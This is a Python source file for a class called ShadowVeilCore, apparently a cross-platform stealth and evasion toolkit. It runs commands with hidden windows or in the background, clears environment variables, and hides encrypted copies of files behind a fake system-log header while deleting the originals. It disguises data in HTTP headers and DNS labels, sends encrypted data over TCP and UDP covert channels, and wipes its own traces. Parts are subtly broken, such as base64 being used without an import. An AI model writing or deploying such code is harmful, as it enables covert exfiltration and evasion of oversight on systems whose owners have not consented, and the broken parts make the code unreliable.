import os
import sys
import platform
import logging
import subprocess
import re
import binascii
import hashlib
import socket
import tempfile
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend

class ShadowVeilCore:
    def __init__(self, stealth_mode="standard", encryption_level="high"):
        self.stealth_mode = stealth_mode
        self.encryption_level = encryption_level
        self.os_type = platform.system().lower()
        self.temp_dir = self._get_platform_temp_dir()
        self.crypto_store = Path(self.temp_dir) / ".crypto_store"
        self.setup_done = False
        self.fernet = None
        
    def _get_platform_temp_dir(self):
        """Get OS-appropriate temp directory"""
        if self.os_type == "windows":
            return os.getenv('TEMP', 'C:\\Windows\\Temp')
        elif self.os_type == "darwin":
            return '/private/tmp'
        else:  # Linux/Unix
            return '/dev/shm' if os.path.exists('/dev/shm') else '/tmp'

    def setup(self):
        try:
            self._init_crypto()
            self._create_crypto_store()
            self._setup_logging()
            self._sanitize_environment()
            self.setup_done = True
            return True
        except Exception as e:
            self._safe_log(f"Setup failed: {str(e)}")
            return False

    def _init_crypto(self):
        """Initialize cryptography independent of OS"""
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=os.urandom(16),
            iterations=100000,
            backend=default_backend()
        )
        key = base64.urlsafe_b64encode(kdf.derive(os.urandom(32)))
        self.fernet = Fernet(key)

    def _create_crypto_store(self):
        """Create secure storage location"""
        os.makedirs(self.crypto_store, exist_ok=True)
        if self.os_type != "windows":
            os.chmod(self.crypto_store, 0o700)

    def _setup_logging(self):
        """OS-independent logging setup"""
        self.logger = logging.getLogger('system_service')
        self.logger.setLevel(logging.INFO)
        
        if self.stealth_mode == "paranoid":
            handler = logging.NullHandler()
        else:
            log_file = self.crypto_store / ".system.log"
            handler = logging.FileHandler(log_file)
        
        handler.setFormatter(logging.Formatter(
            '%(asctime)s [System]: %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        ))
        self.logger.addHandler(handler)

    def _sanitize_environment(self):
        """Clean environment variables across platforms"""
        # Preserve only essential variables
        keep_vars = ['PATH', 'TEMP', 'TMP', 'HOME', 'USER', 'USERNAME']
        new_env = {}
        
        for var in keep_vars:
            value = os.environ.get(var)
            if value:
                new_env[var] = value
                
        # Add platform-specific essentials
        if self.os_type == "windows":
            new_env['ComSpec'] = os.environ.get('ComSpec', 'C:\\Windows\\System32\\cmd.exe')
        else:
            new_env['SHELL'] = os.environ.get('SHELL', '/bin/sh')
        
        os.environ.clear()
        os.environ.update(new_env)

    def execute_stealth(self, command):
        """Run command with stealth parameters"""
        creationflags = 0
        startupinfo = None
        
        if self.os_type == "windows":
            creationflags = (
                subprocess.CREATE_NO_WINDOW |
                subprocess.CREATE_NEW_PROCESS_GROUP
            )
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0
        else:
            # Unix-based systems
            command = f"nohup {command} > /dev/null 2>&1 &"

        proc = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            env=os.environ.copy(),
            creationflags=creationflags,
            startupinfo=startupinfo
        )
        return proc.pid

    def encrypt_data(self, data):
        """OS-independent encryption"""
        if isinstance(data, str):
            data = data.encode()
        return self.fernet.encrypt(data)

    def decrypt_data(self, encrypted_data):
        """OS-independent decryption"""
        return self.fernet.decrypt(encrypted_data).decode()

    def tunnel_file(self, file_path, hidden_path=None):
        """Filesystem tunneling using steganography"""
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
                
            encrypted_data = self.encrypt_data(data)
            
            if not hidden_path:
                hidden_path = Path(self.temp_dir) / f".tmp_{os.urandom(4).hex()}"
                
            # Write with misleading header
            with open(hidden_path, 'wb') as f:
                if self.os_type == "windows":
                    f.write(b"\xFF\xFE")  # UTF-16 BOM
                f.write(b"# System Log File - Do Not Modify\n")
                f.write(encrypted_data)
                
            os.unlink(file_path)
            return str(hidden_path)
        except Exception as e:
            self.logger.error(f"Tunneling failed: {str(e)}")
            return file_path

    def camouflage_traffic(self, data, protocol="http"):
        """Network traffic camouflage"""
        encrypted = self.encrypt_data(data)
        
        if protocol == "http":
            return f"X-System-Info: {binascii.b2a_base64(encrypted).decode()}\r\n".encode()
        
        elif protocol == "dns":
            hex_data = binascii.hexlify(encrypted).decode()
            return f"{hex_data[:63]}.example.com".encode()
            
        return data

    def covert_channel(self, data, protocol="tcp"):
        """Covert communication channels"""
        try:
            encrypted = self.encrypt_data(data)
            
            if protocol == "tcp":
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect(("8.8.8.8", 80))
                    s.sendall(f"GET /?{encrypted.hex()} HTTP/1.1\r\nHost: example.com\r\n\r\n".encode())
                    return True
                    
            elif protocol == "udp":
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.sendto(encrypted, ("8.8.8.8", 53))
                    return True
                    
        except Exception:
            return False

    def clean_system(self):
        """Secure cleanup across platforms"""
        try:
            # Wipe crypto store
            for item in self.crypto_store.glob('*'):
                if item.is_file():
                    self._secure_delete(item)
                    
            # Remove temp directory
            if self.crypto_store.exists():
                self._secure_delete(self.crypto_store)
                
            return True
        except Exception:
            return False

    def _secure_delete(self, path):
        """Cross-platform secure deletion"""
        try:
            # Multiple overwrite passes
            with open(path, 'ba+') as f:
                length = f.tell()
                for _ in range(3):
                    f.seek(0)
                    f.write(os.urandom(length))
                    f.flush()
                    
            # Rename before deletion
            temp_name = path.with_name(f".tmp_{os.urandom(4).hex()}")
            os.rename(path, temp_name)
            os.unlink(temp_name)
        except Exception:
            try:
                os.unlink(path)
            except:
                pass

    def _safe_log(self, message):
        """Fallback logging"""
        try:
            log_path = Path(self.temp_dir) / ".system_install.log"
            with open(log_path, 'a') as f:
                f.write(f"[ShadowVeil] {message}\n")
        except:
            pass